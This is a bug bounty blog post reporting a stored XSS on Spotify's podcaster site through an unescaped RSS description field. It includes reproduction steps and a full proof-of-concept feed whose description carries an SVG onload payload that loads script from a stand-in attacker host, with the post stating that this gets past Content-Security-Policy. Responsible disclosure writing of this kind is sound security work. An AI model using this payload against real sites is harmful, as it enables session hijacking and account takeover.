---
layout: post
title: A XSS on podcasters.spotify.com 
date: 2021-04-06 16:49:47 +07:00
#modified: 2020-10-26 16:49:47 +07:00
description: A quick report of a XSS vulnerability discovered on podcasters.spotify.com.
tags:
  - bug bounty
  - spotify
  - xss
  - web vulnerability
image: /assets/img/xss-on-spotify/
---

In this blog post I'll share a report I wrote a few months ago for a XSS bug found on `podcasters.spotify.com`. This was submitted on [HackerOne](https://hackerone.com/) but unfortunately, it was already reported and mine was considered a duplicate, oh well, better luck next time.


## Summary
When a user submits a new podcast RSS feed for verification, the description tag inside it is not properly escaped. This results in JavaScript being executed on the page which could allow attackers to hijack users' session cookies and/or take over accounts.

## Impact
When a user submits a malicious or compromised podcast RSS feed, attackers would be able to hijack the user's account.

[![XSS Example 1]({{page.image}}spotify-xss-example.png)]({{page.image}}spotify-xss-example.png)

[![XSS Example 2]({{page.image}}spotify-xss-example2.png)]({{page.image}}spotify-xss-example2.png)

### Steps To Reproduce

1. Start by navigating to: `https://podcasters.spotify.com/submit`
2. Click on "Get Started" button
3. Submit a malicious RSS feed link (proof of concept provided)
4. The page renders whatever is in `<description></description>` 

The proof of concept simply shows the logged-in user's cookie in the web browser. I've provided a link to my custom podcast RSS feed: `https://attacker.com/feed.xml`. The **feed.xml** attachment contains HTML which includes a **x.js** Javascript which alerts the user's cookie. This was tested to check whether it was possible to get around Content-Security-Policy, and it is.

Sample of **feed.xml** (view attachment):
```xml
----[CUT]----
<description>
<![CDATA[<svg/onload=body.appendChild(document.createElement`script`).src='https://attacker.com/x.js' hidden/>]]>
</description>
----[CUT]----
```

And **x.js** simply contains:
```
alert(document.cookie)
```


### Proof of Concept
**feed.xml**

```xml
<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:googleplay="http://www.google.com/schemas/play-podcasts/1.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
<channel>
    <atom:link href="https://attacker.com/feed.xml" rel="self" type="application/rss+xml"/>
    <title>REKITTO</title>
    <link>https://attacker.com/feed.xml</link>
    <language>en-gb</language>
    <description><![CDATA[<svg/onload=body.appendChild(document.createElement`script`).src='https://attacker.com/x.js' hidden/>]]></description>
    <image>
      <url>https://attacker.com/serial-itunes-logo.png</url>
      <title>XYZ</title>
      <link>https://attacker.com/</link>
    </image>
    <itunes:explicit>no</itunes:explicit>
    <itunes:type>episodic</itunes:type>
    <itunes:subtitle>True stories from the dark side of the Internet</itunes:subtitle>
    <itunes:author>Tester</itunes:author>
    <itunes:summary>Summary text here.</itunes:summary>
    <itunes:owner>
      <itunes:name>Tester</itunes:name>
      <itunes:email>user@example.com</itunes:email>
    </itunes:owner>
    <itunes:image href="https://attacker.com/serial-itunes-logo.png"/>
    <itunes:category text="Technology">
    </itunes:category>
    <item>
      <title>Streaming: The Example Show</title>
      <description>Some text here.</description>
      <pubDate>Sat, 23 May 2020 03:29:15 -0000</pubDate>
      <itunes:title>Testing</itunes:title>
      <itunes:episodeType>trailer</itunes:episodeType>
      <itunes:keywords><![CDATA[<p>More Text</p>]]></itunes:keywords>
      <itunes:author>Tester</itunes:author>
      <itunes:image href="https://attacker.com/serial-itunes-logo.png"/>
      <itunes:subtitle>Streaming: The Example Show</itunes:subtitle>
      <itunes:summary>Another summary :)</itunes:summary>
      <content:encoded>
        <![CDATA[<p>Even more encoded text</p>]]>
      </content:encoded>
      <itunes:duration>6</itunes:duration>
      <itunes:explicit>no</itunes:explicit>
      <guid isPermaLink="false"><![CDATA[dd10738e-9efg-11ea-bb2d-cf99e05d892b]]></guid>
      <enclosure url="https://attacker.com/sample.mp3" length="6" type="audio/mpeg"/>
    </item>
  </channel>
</rss>
```
